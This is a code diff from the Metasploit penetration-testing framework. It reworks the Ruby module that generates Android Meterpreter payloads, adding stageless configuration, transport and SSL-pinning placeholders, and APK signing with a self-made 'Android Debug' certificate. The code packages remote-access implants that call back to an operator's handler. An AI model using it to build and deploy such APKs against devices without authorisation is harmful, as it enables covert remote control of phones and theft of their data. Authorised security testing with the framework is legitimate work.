@@ -1,7 +1,12 @@
 # -*- coding: binary -*-
 require 'msf/core'
+require 'msf/core/payload/uuid/options'
+require 'msf/core/payload/transport_config'
 
-module Msf::Payload::Dalvik
+module Msf::Payload::Android
+
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::UUID::Options
 
   #
   # Fix the dex header checksum and signature
@@ -31,25 +36,53 @@ module Msf::Payload::Dalvik
     [str.length].pack("N") + str
   end
 
-  def apply_options(classes)
+  def apply_options(classes, opts)
     timeouts = [
       datastore['SessionExpirationTimeout'].to_s,
       datastore['SessionCommunicationTimeout'].to_s,
       datastore['SessionRetryTotal'].to_s,
       datastore['SessionRetryWait'].to_s
     ].join('-')
-    string_sub(classes, 'TTTT                                ', 'TTTT' + timeouts)
+    if opts[:stageless]
+      config = generate_config_hex(opts)
+      string_sub(classes, 'UUUU' + ' ' * 8191, 'UUUU' + config)
+    end
+    if opts[:ssl]
+      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                           datastore['HandlerSSLCert'])
+      if verify_cert_hash
+        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
+        string_sub(classes, 'WWWW                                        ', hash)
+      end
+    end
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + payload_uri)
+    string_sub(classes, 'TTTT' + ' ' * 48, 'TTTT' + timeouts)
+  end
+
+  def generate_config_hex(opts={})
+    opts[:uuid] ||= generate_payload_uuid
+
+    config_opts = {
+      ascii_str:  true,
+      arch:       opts[:uuid].arch,
+      expiration: datastore['SessionExpirationTimeout'].to_i,
+      uuid:       opts[:uuid],
+      transports: [transport_config(opts)]
+    }
+
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config.to_b.unpack('H*').first
   end
 
   def string_sub(data, placeholder="", input="")
     data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
   end
 
-  def generate_cert
+  def sign_jar(jar)
     x509_name = OpenSSL::X509::Name.parse(
-      "C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=Unknown"
-      )
-    key  = OpenSSL::PKey::RSA.new(1024)
+      "C=US/O=Android/CN=Android Debug"
+    )
+    key  = OpenSSL::PKey::RSA.new(2048)
     cert = OpenSSL::X509::Certificate.new
     cert.version = 2
     cert.serial = 1
@@ -74,7 +107,32 @@ module Msf::Payload::Dalvik
     # If this line is left out, signature verification fails on OSX.
     cert.sign(key, OpenSSL::Digest::SHA1.new)
 
-    return cert, key
+    jar.sign(key, cert, [cert])
   end
+
+  def generate_jar(opts={})
+    if opts[:stageless]
+      classes = MetasploitPayloads.read('android', 'meterpreter.dex')
+    else
+      classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
+    end
+
+    apply_options(classes, opts)
+
+    jar = Rex::Zip::Jar.new
+    files = [
+      [ "AndroidManifest.xml" ],
+      [ "resources.arsc" ]
+    ]
+    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
+    jar.add_file("classes.dex", fix_dex_header(classes))
+    jar.build_manifest
+
+    sign_jar(jar)
+
+    jar
+  end
+
+
 end
 
